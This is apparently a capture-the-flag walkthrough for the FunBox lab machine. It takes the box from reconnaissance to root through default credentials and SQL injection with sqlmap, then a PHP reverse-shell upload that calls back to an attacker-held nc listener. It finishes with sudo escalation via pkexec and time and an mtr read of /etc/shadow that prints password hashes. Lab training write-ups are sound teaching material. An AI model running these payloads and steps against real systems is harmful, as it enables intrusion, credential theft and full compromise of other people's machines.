### FUnBoxEasy

Difficulty: Easy

## Enumeration

### Nmap Scan

```bash
$ nmap -sC -sV   -oA nmap/initial 192.168.76.111                                                                                                                                        2 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 11:44 EDT
Nmap scan report for 192.168.76.111
Host is up (0.10s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.51 seconds
```
find / -name proof.txt 2 > /dev/null

### Gobuster 

Navigating to the application on port 80 doesn’t show anything useful, but we can use gobuster with the wordlist __/usr/share/wordlists/dirb/common.txt__ to brute force the site’s directories:

```bash
kali@kali:~$ gobuster dir -u http://192.168.120.224 -w /usr/share/wordlists/dirb/common.txt -z
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
...
/.htpasswd (Status: 403)
/.hta (Status: 403)
/admin (Status: 301)
/.htaccess (Status: 403)
/index.html (Status: 200)
/index.php (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/store (Status: 301)
...
```

Our scan reveals a few directories of interest: /admin (decoy), /secret (decoy), and /store.

Navigating to http://192.168.120.224/admin/, we see a login control. And navigating to http://192.168.120.224/store/, we see a link `Admin Logi`n in the lower-right portion of the screen that leads to another login control at http://192.168.120.224/store/admin.php


###  Exploitation

There are a couple of ways to proceed at this point.

### Login Bruteforce

We can simply try one of the well-known default credential pairs `admin:admin` against http://192.168.120.224/store/admin.php. And we will find that we are logged in as the administrator user of this web store.

### SQL Injection Vulnerability


Alternatively, we can exploit an SQL injection vulnerability in the unauthenticated portion of this application. Clicking on a book image (for example, `C# 6.0 in a Nutshell`), we are directed to its page with the bookisbn GET parameter, like this:

```bash
http://192.168.120.224/store/book.php?bookisbn=978-1-49192-706-9
```

We can try a simple payload to test for SQLi vulnerabilities ' or 1=1; --, like so:

```bash
http://192.168.120.224/store/book.php?bookisbn=%27%20or%201=1;%20--
```
And we see that this application indeed seems to be vulnerable based on the following verbose error:
```bash
Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 
```
### SQLMap
Since the website directory for the store is aptly names `store`, we can venture an educated guess that the underlying database might also be named `store`. Using `sqlmap`, we can automate the exploitation and leak database contents:

```bash
kali@kali:~$ sqlmap -u http://192.168.120.224/store/book.php?bookisbn= --dump-all --batch -D store
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

...

Database: store                                                                                                          
Table: admin
[1 entry]
+-------+--------------------------------------------------+
| name  | pass                                             |
+-------+--------------------------------------------------+
| admin | d033e22ae348aeb5660fc2140aec35850c4da997 (admin) |
+-------+--------------------------------------------------+
```

And we have obtained the user credentials `admin:admin` via this vulnerability.

### File Upload Vulnerability

Having logged in with the recovered or guessed credentials admin:admin at http://192.168.120.224/store/admin.php, we are redirected to http://192.168.120.224/store/admin_book.php. This page shows a listing of existing books.

In addition, we see a link to `Add new book` in the top-left portion of the screen that leads us to http://192.168.120.224/store/admin_add.php. Here, it looks like we are able to upload a new file to the store.

We can try uploading a PHP reverse shell from PentestMonkey:

```bash
kali@kali:~$ cat php-reverse-shell.php 
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
...

$ip = '192.168.118.3';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
...
kali@kali:~$
```

There is one caveat in the upload process: the Publisher text field cannot be arbitrary and must be one of several choices. We can easily view these choices on the page http://192.168.120.224/store/publisher_list.php:

We see Apress as one of the choices listed, and we will use this publisher label. The rest of the fields can contain arbitrary data, like so:

If we now return to `http://192.168.120.224/store/admin_book.php`, we will see our new entry added to the top of the list:

Next, we will set up a listener on port `4444` and then trigger the reverse shell by navigating to `http://192.168.120.224/store/`

```bash
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.224: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.224] 38114
Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:16:51 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
And we have a reverse shell as user `www-data`.

### Escalation

#### User Credential Disclosure

Enumerating the /home directory, we find an interesting file /`home/tony/password.txt`:


```bash
$ ls -l /home
total 4
drwxr-xr-x 2 tony tony 4096 Oct 30 13:11 tony
$ ls -l /home/tony
total 4
-rw-rw-r-- 1 tony tony 70 Jul 31 14:39 password.txt
$
```
Inside of it, we find what looks to be the password for the user next to `ssh`:.

```bash
$ cat /home/tony/password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
$
```

### SSH
We can try to SSH to the target with the credentials `tony:yxcvbnmYYY`, and we succeed:

```bash
kali@kali:~$ ssh -o StrictHostKeyChecking=no tony@192.168.120.224
tony@192.168.120.224's password: 
...
tony@funbox3:~$ id
uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
tony@funbox3:~$

```

### Sudo Enumeration

We will first enumerate what this user is able to run with elevated permissions, and we find an array of binaries at our disposal:

```bash
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
tony@funbox3:~$
```


Of special note are binaries `/usr/bin/pkexec`, `/usr/bin/time`, and `/usr/bin/mtr`. Also, .smile.sh does not exist, nor do any of those directories.


__Escalation via pkexec__

First, we are able to escalate our privilege to root using `/usr/bin/pkexec` as follows:

```bash
tony@funbox3:~$ whoami
tony
tony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh
# whoami
root
```

__Escalation via time__
Alternatively, we can escalate our privilege to root using `/usr/bin/time` as follows:

```bash
tony@funbox3:~$ whoami
tony
tony@funbox3:~$ sudo /usr/bin/time /bin/sh
# whoami
root
#
```

__Reading System Files via mtr__


In addition, we are able to read any system file (for example` /etc/shadow`) using` /usr/bin/mtr` as follows:

```bash
tony@funbox3:~$ whoami
tony
tony@funbox3:~$ LFILE=/etc/shadow
tony@funbox3:~$ sudo /usr/bin/mtr --raw -F "$LFILE"
/usr/bin/mtr: Failed to resolve host: root:$6$4r./2lj6ZWMvAM8d$a/WAF4NlJsHGELA./0HVNg.dAqY6Aqzws5PHMdWvBkzQbbEgl9BzTINMP2w00yuZcevYuFPfefGxnHT76kuzm1:18564:0:99999:7:::: Name or service not known
...
/usr/bin/mtr: Failed to resolve host: tony:$6$3CcVDtP8rpQ/g1AY$tpRzq31JEsdsbEi4AD7wG5XfgrEwsr0j4vHqSQmkTpYvx.yHrB/xv3pv8Xlko/5P4vzW4v8BC3tG/YPtbbzVN0:18473:0:99999:7:::: Name or service not known
/usr/bin/mtr: Failed to resolve host: lxd:!:18473::::::: Name or service not known
/usr/bin/mtr: Failed to resolve host: mysql:!:18473:0:99999:7:::: Name or service not known
tony@funbox3:~$
```



